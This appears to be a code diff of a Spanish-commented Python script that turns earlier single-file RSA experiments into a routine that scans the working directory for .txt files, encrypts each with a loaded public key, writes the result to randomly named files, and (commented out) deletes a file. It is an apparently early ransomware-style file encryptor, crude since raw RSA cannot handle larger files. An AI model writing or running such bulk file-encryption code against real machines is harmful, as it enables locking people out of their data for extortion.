@@ -1,40 +1,54 @@
 import fernet
 import rsa
-'''#r=crypto.Random.new().read
-(pubkey,privkey)=rsa.newkeys(1024)
-message=b'mysecret'
-crypto=rsa.encrypt(message,pubkey)
-decr=rsa.decrypt(crypto,privkey)
-print(decr.decode())'''
+import base64
+import random
+from os import scandir, getcwd
+import os
 
-#abrir el archivo con la llave simetrica
-#skey=open('symmetric.key','rb')
-#key=skey.read()
-#creando el cifrado
-#cipher=fernet.Fernet(key)
+#funcion que lista los archivos del directorio
+def listar(ruta = getcwd()):
+    return [arch.name for arch in scandir(ruta) if arch.is_file()]
+#funcion que clasifica los archivos del directorio en JPG y txt
+def filtrar_archivos(listado_general_archivos):
+    archivos_filtrados = list()
+    for x in range(len(listado_general_archivos)):
+        if '.txt' in listado_general_archivos[x]:# or '.JPG' in listado_general_archivos[x]:
+            archivos_filtrados.append(listado_general_archivos[x])
+    return archivos_filtrados
+def encriptar(files):
+    #abrir la llave publica
+    pkey = open('publickey.key', 'rb')
+    pkdata = pkey.read()
+    #cargar la llave
+    pubkey = rsa.PublicKey.load_pkcs1(pkdata)
 
-#abriendo el archivo a cifrar
-myfile=open('archivo.txt','rb')
-myfiledata=myfile.read()
+    #pkey.close()
+    for x in range(len(files)):
+        myfile = open(files[x], 'rb')
+        myfiledata = myfile.read()
+        myfile.close()
+        encrypted_file = rsa.encrypt(myfiledata, pubkey)
 
-#encriptar archivo
-#encrypted_data=cipher.encrypt(myfiledata)
-#edata=open('archivoencriptado','wb')
-#edata.write(encrypted_data)
+        strRandom=str(random.random())
+        nameRandom=strRandom[2:]
+        fkey = open(nameRandom, 'wb')
+        fkey.write(encrypted_file)
+        fkey.close()
 
-#print(encrypted_data)
 
-#abrir llave publica
-pkey=open('publickey.key','rb')
-pkdata=pkey.read()
 
-#cargar la llave
-pubkey=rsa.PublicKey.load_pkcs1(pkdata)
 
-#encriptando el archivo con la llave simetrica
-encrypted_key=rsa.encrypt(myfiledata,pubkey)
+def main():
+    dir=listar()
+    fileFilters=filtrar_archivos(dir)
+    print(fileFilters)
+    encriptar(fileFilters)
+if __name__== '__main__':
+    main()
 
-ekey=open('encrypted_key','wb')
-ekey.write(encrypted_key)
 
-print(encrypted_key)
+#try:
+ #   ho=6
+  #  os.remove('ejemplo_borrar.txt')
+#except OSError as e:
+   # print(f"Error:{e.strerror}")
